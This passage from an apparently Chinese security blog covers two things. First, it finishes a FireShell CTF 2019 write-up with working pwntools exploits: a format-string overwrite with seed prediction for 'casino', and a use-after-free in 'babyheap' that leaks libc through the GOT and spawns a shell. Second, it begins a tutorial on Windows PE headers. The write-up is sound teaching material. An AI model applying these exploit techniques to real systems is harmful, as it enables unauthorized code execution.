time(0) / 0xA; int bet = 2; // 1; seed += bet; srand(seed); for (int i = 0; i &lt; 99; i++) &#123; int a = rand(); printf(\"%d\\n\", a); &#125; return 0;&#125; 先编译，gcc solve.c -o solve；再 pipe 一下，(echo &#39;test&#39;; ./solve) | ./casino。得到结果是： 123[1/100] Guess my number: Correct!...[99/100] Guess my number: Correct! 说明猜数字过了，而 bet 累加起来只有 99，没有超过 100。此时回忆之前的代码，printf(&quot;Welcome &quot;, &amp;buf);存在格式化字符串漏洞，我们只需要通过这个漏洞，将bet的值改写即可。通过 gdb 调试得到bet的地址： 123456789[-------------------------------------code-------------------------------------] 0x400ac3 &lt;main+132&gt;: call 0x400840 &lt;printf@plt&gt; 0x400ac8 &lt;main+137&gt;: mov edi,0xa 0x400acd &lt;main+142&gt;: call 0x4007f0 &lt;putchar@plt&gt;=&gt; 0x400ad2 &lt;main+147&gt;: mov eax,DWORD PTR [rip+0x201548] # 0x602020 &lt;bet&gt; 0x400ad8 &lt;main+153&gt;: add DWORD PTR [rbp-0x50],eax 0x400adb &lt;main+156&gt;: mov eax,DWORD PTR [rbp-0x50] 0x400ade &lt;main+159&gt;: mov edi,eax 0x400ae0 &lt;main+161&gt;: call 0x400870 &lt;srand@plt&gt; 确定第一个参数在栈上的偏移为 11： 1234567891011[casino] python -c 'print \"%2c%11$n\" + \"\\x20\\x20\\x60\\x00\\x00\\x00\\x00\\x00\"' &gt; input 20:06:05[casino] gdb ./casino -q 20:06:11Reading symbols from ./casino...(no debugging symbols found)...done.assassinq&gt;&gt; b *main+137Breakpoint 1 at 0x400ac8assassinq&gt;&gt; r &lt; inputStarting program: /root/ctf/2019-FireShell/casino/casino &lt; inputWhat is your name? Welcome ? `Breakpoint 1, 0x0000000000400ac8 in main ()assassinq&gt;&gt; x/wx 0x6020200x602020 &lt;bet&gt;: 0x00000002 我把 bet 的值改为 2。最后的 exp 如下： 12345678910111213141516171819202122#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./casino')else: passbet_addr = 0x0000000000602020bet = 2offset = 11fmt = '%&#123;&#125;c%&#123;&#125;$n'payload = flat([fmt.format(str(bet), str(offset)), bet_addr])p.sendlineafter('name?', payload)s = process('./solve')nums = s.recvall().split('\\n')[:-1]s.close()for n in nums: p.sendlineafter('number:', n)print p.recvall()p.close() babyheap1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; unsigned int c; // eax char s; // [rsp+10h] [rbp-10h] unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); init_buf(); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; welcome(); printf(\"&gt; \", a2); memset(&amp;s, 0, 8uLL); a2 = (char **)&amp;s; read(0, &amp;s, 8uLL); c = atoi(&amp;s); if ( c != 3 ) break; if ( show_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; show(); &#125; if ( c &gt; 3 ) break; if ( c == 1 ) &#123; if ( create_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; create(); &#125; else &#123; if ( c != 2 ) goto LABEL_33; if ( edit_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; edit(); &#125; &#125; if ( c == 5 ) &#123; puts(\"Bye!\"); exit(0); &#125; if ( c &lt; 5 ) &#123; if ( delete_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; delete(); &#125; else &#123; if ( c != 1337 ) &#123;LABEL_33: puts(\"Invalid option\"); exit(0); &#125; if ( secret_flag == 1 ) &#123; puts(\"Again? Oh no, you can't\"); exit(0); &#125; secret(); &#125; &#125;&#125; 菜单题，对操作次数有限制，create两次次，delete、edit、show各一次。还有一个隐藏选项secret可以同时create和edit。在delete中发现并没有给指针置零，很明显的可以 uaf。在 ida 中可以看到 bss 上变量的分布： 1234567891011121314.bss:00000000006020A0 create_flag dq ? ; DATA XREF: create+21↑w.bss:00000000006020A0 ; delete+1F↑w ....bss:00000000006020A8 edit_flag dq ? ; DATA XREF: edit+2E↑w.bss:00000000006020A8 ; main:loc_400AC1↑r.bss:00000000006020B0 show_flag dq ? ; DATA XREF: show+1F↑w.bss:00000000006020B0 ; main:loc_400AF3↑r.bss:00000000006020B8 delete_flag dq ? ; DATA XREF: delete+2A↑w.bss:00000000006020B8 ; main:loc_400B25↑r.bss:00000000006020C0 secret_flag dq ? ; DATA XREF: secret+3F↑r.bss:00000000006020C0 ; secret+4A↑w ....bss:00000000006020C8 ; void *buf.bss:00000000006020C8 buf dq ? ; DATA XREF: create+E↑w.bss:00000000006020C8 ; edit+15↑r ....bss:00000000006020C8 _bss ends 利用 uaf 将 chunk 移到 bss 上，可以把所有的选项置零，同时把 buf 改成某个地址，可以做到任意地址写。这里用atoi的 got，可以用show泄漏 libc 地址，然后将/bin/sh作为参数传入atoi，最后执行system(&quot;/bin/sh&quot;);。exploit： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.terminal = ['tmux', 'sp', '-h']local = 1if local: p = process('./babyheap', env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)else: p = remote('51.68.189.144', 31005)elf = ELF('./babyheap')libc = ELF('./libc.so.6')atoi_got = elf.got['atoi']info('atoi_got = ' + hex(atoi_got))buf = 0x006020A0gdb.attach(p)def create(): p.sendafter('&gt; ', '1')def edit(data): p.sendafter('&gt; ', '2') p.sendafter('Content? ', data)def show(): p.sendafter('&gt; ', '3')def delete(): p.sendafter('&gt; ', '4')def fill(data): p.sendafter('&gt; ', '1337') p.sendafter('Fill ', data)create()delete()edit(p64(buf))create()payload = '\\x00' * 0x28 + p64(atoi_got)fill(payload)show()atoi = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00'))libc_base = atoi - libc.symbols['atoi']success('libc_base = ' + hex(libc_base))system = libc_base + libc.symbols['system']edit(p64(system))p.sendafter('&gt; ', '/bin/sh')p.interactive() 参考网站https://cute-0tter.hatenablog.com/entry/2019/01/28/153836https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NAhttps://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aughttps://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.mdhttps://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.mdhttps://github.com/happysox/CTF_Writeups/tree/master/Fireshell_CTF_2019/babyheap","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"RE入门（三）","slug":"RE入门（三）","date":"2019-01-28T05:03:31.000Z","updated":"2019-11-07T01:51:02.119Z","comments":true,"path":"2019/01/28/RE入门（三）/","link":"","permalink":"qianfei11.coding.me/2019/01/28/RE入门（三）/","excerpt":"摘自《逆向工程核心原理》中关于 Windows 操作系统的 PE（Portable Executable）文件格式的部分，其中也有关于进程、内存、DLL 等的内容，它们是 Windows 操作系统中最核心的部分。","text":"摘自《逆向工程核心原理》中关于 Windows 操作系统的 PE（Portable Executable）文件格式的部分，其中也有关于进程、内存、DLL 等的内容，它们是 Windows 操作系统中最核心的部分。 PE 文件格式介绍PE 文件是 Windows 操作系统下使用的可执行文件格式。它是微软在 UNIX 平台的 COFF（Common Object File Format，通用对象文件格式）基础上制作而成的。最初（正如 Portable 这个单词所代表的那样）设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列的操作系统下。 PE 文件是指 32 位的可执行文件，也称为 PE32。64 位的可执行文件成为 PE+ 或 PE32+，是 PE（PE32）文件的一种扩展形式（请注意不是 PE64）。 PE 文件格式PE 文件种类如表所示。 种类 主扩展名 可执行系列 EXE、SCR 库系列 DLL、OCX、CPL、DRV 驱动程序系列 SYS、VXD 对象文件系列 OBJ 严格地说，OBJ（对象）文件之外的所有文件都是可执行的。DLL、SYS 文件等虽然不能直接在 Shell（Explorer.exe）中运行，但可以使用其他方式（调试器、服务等）执行。 根据 PE 正式规范，编译结果 OBJ 文件也视为 PE 文件。但是 OBJ 文件本身不能以任何形式执行，在代码逆向分析中几乎不需要关注它。 接下来以记事本（Windows XP SP3 的 notepad.exe，与其他版本 Windows 下的 notepad.exe 文件结构类似，但是地址不同）程序进行简单说明。 下面是 notepad.exe 文件的起始部分，也是 PE 文件的头部分（PE header）。notepad.exe 文件运行需要的所有信息就存储在这个 PE 头中。如果加载到内存、从何处开始运行、运行中需要的 DLL 有哪些、需要多大的栈/堆内存等，大量信息以结构体形式存储在 PE 头中。换言之，学习 PE 文件格式就是学习 PE 头中的结构体。 基本结构notepad.exe 具有普通 PE 文件的基本结构。从 DOS 头（DOS header）到节区头（Section header）是 PE 头部分，其下的节区合称 PE 体。文件中使用偏移（offset），内存中使用 VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区的大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。 根据所用的不同开发工具（VB/VC++/Delphi/etc）与编译选项，节区的名称、大小、个数、存储的内容等都是不同的。最重要的是它们按照不同的用途分类保存到不同的节中。 各节区头定义了各节区在文件或内存中的大小、位置、属性等。 PE 头与各节区的尾部存在一个区域，称为 NULL 填充（Null padding）。计算机中，为了提高处理文件、内存、网络包的效率，使用“最小基本单位”这一概念，PE 文件中也类似。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数位置上，空白区域将用 NULL 填充（可以看到各节区起始地址的截断都遵循一定的规则）。 VA&amp;RVAVA 指的是进程虚拟内存的绝对地址，RVA（Relative Virtual Address，相对虚拟地址）指从某个基准位置（ImageBase）开始的相对地址。VA 和 RVA 满足下面的换算关系。 1RVA+ImageBase=RA PE 头内部信息大多以 RVA 形式存在。原因在于，PE 文件（主要是 DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他 PE 文件（DLL）。此时必须通过重定位（Relocation）将其加载到其他空白的位置，若 PE 头信息使用的是 VA，则无法正常访问。因此使用 RVA 来定位信息，即使发生了重定位，只要相对于基准位置的相对地址没有变化，就能正常访问到指定信息，不会出现任何问题。 32 位 Windows OS 中，各进程分配有 4GB 的虚拟内存，因此进程中 VA 值的范围是 00000000~FFFFFFFF。 PE 头PE 头由许多结构体组成。 DOS 头微软创建 PE 文件格式时，人们正广泛使用 DOS 文件，所以微软充分考虑了 PE 文件对 DOS 文件的兼容性。其结果是在 PE 头的最前面添加了一个 IMAGE_DOS_HEADER 结构体，用来扩展已有的 DOS EXE 头。 123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; WORD e_magic; // DOS signature : 4D5A (\"MZ\") WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; // offset to NT header&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; IMAGE_DOS_HEADER 结构体的大小为 40 个字节。在该结构中必须知道 2 个重要成员：e_magic 与 e_lfanew。 e_magic：DOS 签名（signature，4D5A=&gt;ASCII 值“MZ”） e_lfanew：指示 NT 头的偏移（根据不同文件拥有可变值） 所有 PE 文件在你开始部分（e_magic）都有 DOS 签名（“MZ”）。e_lfanew 值指向 NT 头所在位置（NT 头的名称为 IMAGE_NT_HEADERS，后面将会介绍）。 一个名叫 Mark Zbikowski 的开发人员在微软设计了 DOS 可执行文件，MZ 即取自其名字的首字母。 根据 PE 规范，文件开始的 2 个字节为 4D5A，e_lfanew 的值为 000000E0（不是 E0000000） Intel 系列的 CPU 以逆序存储数据，称为小端序标识法。 如果尝试修改这些值，会发现程序无法正常运行（因为根据 PE 规范，它已不再是 PE 文件了）。 DOS 存根DOS 存根（stub）在 DOS 头下方，是个可选项，且大小不固定（即使没有 DOS 存根，文件也能正常运行）。DOS 存根由代码与数据混合而成。 图中，文件偏移 40~4D 区域为 16 位的汇编指令。32 位的 Windos OS 中不会运行该命令（由于被识别为 PE 文件，所以完全忽视该代码）。在 DOS 环境中运行 Notepad.exe 文件，或者使用 DOS 调试器（debug.exe）运行它，可使其执行该代码（不认识 PE 文件格式，所以被识别为 DOS EXE 文件）。 在 Windows XP 下打开命令行窗口（cmd.exe），输入debug C:\\Windows\\notepad.exe。输入 “u” 指令（Unassemble），将会出现 16 位的汇编指令。 123456789101112131415161718192021-u0B39:0000 0E PUSH CS0B39:0001 1F POP DS0B39:0002 BA0E00 MOV DX,000E ; DX = 0E : &quot;This program cannot be run in DOS mode&quot;0B39:0005 B409 MOV AH,090B39:0007 CD21 INT 21 ; AH = 09 : WriteString()0B39:0009 B8014C MOV AX,4C010B39:000C CD21 INT 21 ; AX = 4C01 : Exit()0B39:000E 54 PUSH SP0B39:000F 68 DB 680B39:0010 69 DB 690B39:0011 7320 JNB 00330B39:0013 7072 JO 00870B39:0015 6F DB 6F0B39:0016 67 DB 670B39:0017 7261 JB 007A0B39:0019 6D DB 6D0B39:001A 206361 AND [BP+DI+61],AH0B39:001D 6E DB 6E0B39:001E 6E DB 6E0B39:001F 6F DB 6F 代码非常简单，在画面中输出字符串 &quot;This program cannot be run in DOS mode&quot; 后就退出。换言之，notepad.exe文件虽然是 32 位的 PE 文件，但是带有 MS-DOS 兼容模式，可以在 DOS 环境中运行，执行 DOS EXE 代码，输出 &quot;This program cannot be run in DOS mode&quot; 后终止。灵活使用该特性可以在一个可执行文件（EXE）中创建出另一个文件，它在 DOS 与 Windows 中都能运行（在 DOS 环境中运行 16 位 DOS 代码，在 Windows 环境中运行 32 位 Windows 代码）。 如前所述，DOS 存根是可选项，开发工具应该支它（VB、VC++、Delphi 等默认支持 DOS 存根）。 NT 头下面介绍 NT 头 IMAGE_NT_HEADERS。 12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; // PE Signature : 50450000 (\"PE\"00) IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; IMAGE_NT_HEADERS 结构体由 3 个成员组成，第一个成员为签名（Signature）结构体，其值为 50450000h（”PE”00）。另外沥青个成员分别为文件头（File Header）与可选头（Optional Header）结构体。 IMAGE_NT_HEADERS 结构体的大小为 F8，相当大。 NT 头：文件头文件头是表现文件大致属性的 IMAGE_FILE_HEADER 结构体。 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machinie; // 运行平台 WORD NumberOfSections; // 区块表的个数 DWORD TimeDateStamp; // 文件创建时间，是从 1970 年至今的秒数 DWORD PointerToSymbolTable; // 指向符号表的指针 DWORD NumberOfSymbols; // 符号表的数目 WORD SizeOfOptionalHeader; // IMAGE_NT_HEADERS 结构中 OptionHeader 成员的大小，对于 Win32 平台这个值通常是 0x00E0 WORD Characteriistics; // 文件的属性值&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; IMAGE_FILE_HEADERS 结构体中有如下 4 中重要成员（若它们设置不正确，将导致文件无法正常运行）。 Machine每个 CPU 都拥有唯一的 Machine 码，兼容 32 位 Intel x86 芯片的 Machine 码为 14C。以下是定义在 winnt.h 文件中的 Machine 码。 12345678910111213141516171819#define IMAGE_FILE_MACHINE_UNKNOWN 0#define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386.#define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian#define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian#define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2#define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian#define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian#define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian#define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian#define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-endian#define IMAGE_FILE_MACHINE_THUMB 0x01c2#define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64#define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64 NumberOfSections前面提到过，PE 文件把代码、数据、资源等依据属性分类到各节区中存储。 NumberOfSections 用来指出文件中存在的节区数量。该值一定要大于 0，且当定义的节区数量与实际节区不同时，将发生运行错误。 SizeOfOptionalHeaderIMAGE_NT_HEADER 结构体的最后一个成员为 IMAGE_OPTIONAL_HEADER32 结构体。SizeOfOptionalHeader 成员用来指出 IMAGE_OPTIONAL_HEADER32 结构体的长度。IMAGE_OPTIONAL_HEADER32 结构体由 C 语言编写而成，故其大小已经确定。但是 Windows 的 PE 装载器需要查看 IMAGE_FILE_HEADER 的 SizeOfOptionalHeader 值，从而识别出 IMAGE_OPTIONAL_HEADER32 结构体的大小。 PE32+ 格式的文件中使用的是 IMAGE_OPTIONAL_HEADER64 结构体，而不是 IMAGE_OPTIONAL_HEADER32 结构体。2 个结构体的尺寸是不同的，所以需要在 SizeOfOptionalHeader 成员中明确指出结构体的大小。 借助 IMAGE_DOS_HEADER 的 e_lfanew 成员与 IMAGE_FILE_HEADER 的 SizeOfOptionalHeader 成员，可以创建出一种脱离常规的 PE 文件（PE Patch）（也有人称之为 “麻花” PE 文件） Characteristics该字段用于标识文件的属性，文件是否可运行的形态、是否为 DLL 文件等信息，以 bit OR 形式组合起来。 以下是定义在 winnt.h 文件中的 Characteristics 值（请记住 0002h 与 2000h 这两个值）。 12345678910111213141516171819#define IMAGE_FILE_RELOCS_STRIPPED 0x0001 // Relocation info stripped from file.#define IMAGE_FILE_EXECUTABLE_IMAGE 0x0002 // File is executable // (i.e. no unresolved externel references).#define IMAGE_FILE_LINE_NUMS_STRIPPED 0x0004 // Line numbers stripped from file.#define IMAGE_FILE_LOCAL_SYMS_STRIPPED 0x0008 // Local symbols stripped from file.#define IMAGE_FILE_AGGRESIVE_WS_TRIM 0x0010 // Agressively trim working set#define IMAGE_FILE_LARGE_ADDRESS_AWARE 0x0020 // App can handle &gt;2gb addresses#define IMAGE_FILE_BYTES_REVERSED_LO 0x0080 // byte of machine word are reversed.#define IMAGE_FILE_32BIT_MACHINE 0x0100 // 32 bit word machine.#define IMAGE_FILE_DEBUG_STRIPPED 0x0200 // Debugging info stripped from // file in .DBG file#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP 0x0400 // If Image is on removable media, // copy and run from the swap file.#define IMAGE_FILE_NET_RUN_FROM_SWAP 0x0800 // If Image is on Net, // copy and run from the swap file.#define IMAGE_FILE_SYSTEM 0x1000 // System File.#define IMAGE_FILE_DLL 0x2000 // File is a DLL.#define IMAGE_FILE_UP_SYSTEM_ONLY 0x4000 // File should only be run on a UP machine#define IMAGE_FILE_BYTES_REVERSED_HI 0x8000 // byte of machine word are reversed. PE 中 Characteristics 的值有可能不是 0002h（不可执行），比如类似 *.obj 的 object 文件以及 resource DLL 文件等。 最后讲一下 IMAGE_FILE_HEADER 的 TimeDateStamp 成员。改成成员的值不影响文件运行，用来记录编译器创建此文件的时间。但是有些开发工具（VB、VC++）提供了设置该值的工具，而有些开发工具（Delphi）则未提供（且随所用选项的不同而不同）。 IMAGE_FILE_HEADERIMAGE_FILE_HEADER 的结构体。 以结构体成员的形式表示如下。 12345678910111213141516[ IMAGE_FILE_HEADER ] - notepad.exe offset value description--------------------------------------------------------------------------000000E4 014C machine000000E6 0003 number of sections000000E8 48025287 time date stamp (Mon Apr 14 03:35:51 2008)000000EC 00000000 offset to symble table000000F0 00000000 number of symbols000000F4 00E0 size of optional header000000F6 010F characteristics IMAGE_FILE_RELOCS_STRIPPED IMAGE_FILE_EXECUTABLE_IMAGE IMAGE_FILE_LINE_NUMS_STRIPPED IMAGE_FILE_LOCAL_SYMS_STRIPPED IMAGE_FILE_32BIT_MACHINE NT 头：可选头IMAGE_OPTIIONAL_HEADER32 是 PE 头结构体中最大的。 12345678910111213141516171819202122232425262728293031323334353637383940414243typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16typedef struct _IMAGE_OPTIONAL_HEADER &#123; // Standard fields. WORD Magic; // 标志字, ROM 映像（0107h），普通可执行文件（010Bh） BYTE MajorLinkerVersion; // 链接程序的主版本号 BYTE MinorLinkerVersion; // 链接程序的次版本号 DWORD SizeOfCode; // 所有含代码的节的总大小 DWORD SizeOfInitializedData; // 所有含已初始化数据的节的总大小 DWORD SizeOfUninitializedData; // 所有含未初始化数据的节的大小 DWORD AddressOfEntryPoint; // 程序执行入口 RVA DWORD BaseOfCode; // 代码的区块的起始 RVA DWORD BaseOfData; // 数据的区块的起始 RVA // NT additional fields. DWORD ImageBase; // 程序的首选装载地址 DWORD SectionAlignment; // 内存中的区块的对齐大小，一般为 0x1000 DWORD FileAlignment; // 文件中的区块的对齐大小，一般为 0x200 WORD MajorOperatingSystemVersion; // 要求操作系统最低版本号的主版本号 WORD MinorOperatingSystemVersion; // 要求操作系统最低版本号的副版本号 WORD MajorImageVersion; // 可运行于操作系统的主版本号 WORD MinorImageVersion; // 可运行于操作系统的次版本号 WORD MajorSubsystemVersion; // 要求最低子系统版本的主版本号 WORD MinorSubsystemVersion; // 要求最低子系统版本的次版本号 DWORD Win32VersionValue; // 莫须有字段，不被病毒利用的话一般为 0 DWORD SizeOfImage; // 映像装入内存后的总尺寸 DWORD SizeOfHeaders; // 所有头 + 区块表的尺寸大小 DWORD CheckSum; // 映像的校检和 WORD Subsystem; // 可执行文件期望的子系统 WORD DllCharacteristics; // DllMain() 函数何时被调用，默认为 0 DWORD SizeOfStackReserve; // 初始化时的栈大小 DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小 DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小 DWORD LoaderFlags; // 与调试有关，默认为 \b0 DWORD NumberOfRvaAndSizes; // 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16 // 数据目录表，保存了各种表的RVA及大小 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 在 IMAGE_OPTIONAL_HEADER32 结构体中需要关注下列成员。这些值谁文件运行必需的，设置错误将导致文件无法正常运行。 Magic为 IMAGE_OPTIONAL_HEADER32 结构体时，Magic 码为 10B；为 IMAGE_OPTIONAL_HEADER64 结构体时，Magic 码为 20B。 AddressOfEntryPointAddressOfEntryPoint 持有 EP 的 RVA 值。该值指出程序最先执行的代码起始地址，相当重要。 ImageBase进程虚拟内存的范围时 0~FFFFFFFF（32 位系统）。PE 文件被加载到如此大的内存中时，ImageBase 指出文件的优先装入地址。 EXE、DLL 文件被装载到用户内存的 0~7FFFFFFF 中，SYS 文件被载入内核内存的 80000000~FFFFFFFF 中。一般而言，使用开发工具（VB/VC++/Delphi）创建好 EXE 文件后，其 ImgaeBase 的值为 00400000，DLL 文件的 ImgaeBase 值为 10000000（当然也可以指定为其他值）。执行 PE 文件时，PE 装载器先创建进程，再将文件载入内存，然后把 EIP 寄存器的值设置为 ImageBase+AddressOfEntryPoint。 SectiionAlignment，FileAlignmentPE 文件的 Body 部分划分为若干节区，这些节存储着不同类别的数据。FileAlignment 指定了节区在磁盘文件中的最小单位，而 SectionAlignment 则指定了节区在内存中的最小单位（一个文件中，FileAlignment 与 SectionAlignment 的值可能相同，也可能不同）。磁盘文件或内存的节区大小必定为 FileAlignment 或 SectionAlignment 值的整数倍。 SizeOfImage加载 PE 文件到内存时，SizeOfImage 指定了 PE Image 在虚拟内存中所占的空间的大小。一般而言，文件的大小与加载到内存中的大小是不同的（节区头中定义了各节装载的位置与占有内存的大小）。 SizeOfHeaderSizeOfHeader 用来指出整个 PE 头的大小。该值也必须是 FileAlignment 的整数倍。第一节区所在位置与 SizeOfHeader 距文件开始偏移的量相同。 Subsystem该 Subsystem 值用来区分系统驱动文件（*.sys）与普通的可执行文件（*.exe，*.dll）。Subsystem 成员可拥有的值如下。 值 含义 备注 1 Driver 文件 系统驱动（如：ntfs.sys） 2 GUI 文件 窗口应用程序（如：notepad.exe） 3 CUI 文件 控制台应用程序（如：cmd.exe） NumberOfRvaAndSizesNumberOfRvaAndSizes 用来指定 DataDirectory（IMAGE_OPTIONAL_HEADER32 结构体的最后一个成员）数组的个数。虽然结构体定义中明确指出了数组个数为 IMAGE_NUMBEROF_DIRECTORY_ENTRIES(16)，但是 PE 装载器通过查看 NumberOfRvaAndSizes 值来识别数组大小，换言之，数组大小也可能不是 16。 DataDirectoryDataDirectory 是由 IMAGE_DATA_DIRECTORY 结构体组成的数组，数组的每项都有被定义的值。 12345678910111213141516DataDirectory[0] = EXPORT DirectoryDataDirectory[1] = IMPORT DirectoryDataDirectory[2] = RESOURCE DirectoryDataDirectory[3] = EXCEPTION DirectoryDataDirectory[4] = SECURITY DirectoryDataDirectory[5] = BASERELOC DirectoryDataDirectory[6] = DEBUG DirectoryDataDirectory[7] = COPYRIGHT DirectoryDataDirectory[8] = GLOBALPTR DirectoryDataDirectory[9] = TLS DirectoryDataDirectory[A] = LOAD_CONFIG DirectoryDataDirectory[B] = BOUND_IMPORT DirectoryDataDirectory[C] = IAT DirectoryDataDirectory[D] = DELAY_IMPORT DirectoryDataDirectory[E] = COM_DESCRIPTOR DirectoryDataDirectory[F] = Reserved Directory 将此处所说的 Directory 想成某个结构体数组即可。比较重要的是EXPORT/IMPORT/RESOURCE、TLS Direction。 IMAGE_OPTIONAL_HEADERIMAGE_OPTIONAL_HEADER 整个结构体。 结构体各成员的值及其说明如下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[ IMAGE_OPTIONAL_HEADER ] - notepad.exe offset value description--------------------------------------------------------------------------000000F8 010B magic000000FA 07 major liinker version000000FB 0A minor liinker version000000FC 00007800 size of code00000100 00008C00 size of initialized data00000104 00000000 size of uninitialized data00000108 0000739D address of entry point0000010C 00001000 base of code00000110 00009000 base of data00000114 01000000 image base00000118 00001000 section alignment0000011C 00000200 file alignment00000120 0005 major OS version00000122 0001 minor OS version00000124 0005 major image version00000126 0001 minor image version00000128 0004 major subsystem version0000012A 0000 minor subsystem version0000012C 00000000 win32 version value00000130 00014000 size of image00000134 00000400 size of headers00000138 000126CE Checksum0000013C 0002 subsystem0000013E 8000 DLL characteristics00000140 00040000 size of stack reserve00000144 00011000 size of stack commit00000148 00100000 size of heap reserve0000014C 00001000 size of heap commit00000150 00000000 loader flags00000154 00000010 number of directories00000158 00000000 RVA of EXPORT Directory0000015C 00000000 size of EXPORT Directory00000160 00007604 RVA of IMPORT Directory00000164 000000C8 size of IMPORT Directory00000168 00000000 RVA of RESOURCE Directory0000016C 00008304 size of RESOURCE Directory00000170 00000000 RVA of EXCEPTION Directory00000174 00000000 size of EXCEPTION Directory00000178 00000000 RVA of SECURITY Directory0000017C 00000000 size of SECURITY Directory00000180 00000000 RVA of BASERELOC Directory00000184 00000000 size of BASERELOC Directory00000188 00001350 RVA of DEBUG Directory0000018C 0000001C size of DEBUG Directory00000190 00000000 RVA of COPYRIGHT Directory00000194 00000000 size of COPYRIGHT Directory00000198 00000000 RVA of GLOBALPTR Directory0000019C 00000000 size of GLOBALPTR Directory000001A0 00000000 RVA of TLS Directory000001A4 00000000 size of TLS Directory000001A8 000018A8 RVA of LOAD_CONFIG Directory000001AC 00000040 size of LOAD_CONFIG Directory000001B0 00000250 RVA of BOUND_IMPORT Directory000001B4 000000D0 size of BOUND_IMPORT Directory000001B8 00001000 RVA of IAT Directory000001BC 00000348 size of IAT Directory000001C0 00000000 RVA of DELAY_IMPORT Directory000001C4 00000000 size of DELAY_IMPORT Directory000001C8 00000000 RVA of COM_DESCRIPTOR Directory000001CC 00000000 size of COM_DESCRIPTOR Directory000001D0 00000000 RVA of Reserved Directory000001D4 00000000 size of Reserved Directory 节区头节区头中定义了各节区属性。前面提到过，PE 文件中的 code（代码）、data（数据）、resource（资源）等按照属性分类存储在不同节区。 把 PE 文件创建成多个节区结构的好处是可以保证程序的安全性。若把 code 与 data 放在一个节区中相互纠缠很容易引发安全问题，即使忽略过程的烦琐。 假如向字符串 data 写数据时，由于某个原因导致溢出（输入超过缓冲区大小时），那么其下的 code（指令）就会被覆盖，应用程序就会崩溃。因此，PE 文件格式的设计者们决定把具有相似属性的数据统一保存在一个被称为 “节区” 的地方，然后需要把各节区属性记录在节区头中（节区属性中有文件/内存的起始位置、大小、访问权限等）。 换言之，需要为每个 code/data/resource 分别设置不同的特性、访问权限等，如下表。 类别 访问权限 code 执行，读取权限 data 非执行，读写权限 resource 非执行，读取权限 IMAGE_SECTION_HEADER节区头是由 IMAGE_SECTION_HEADER 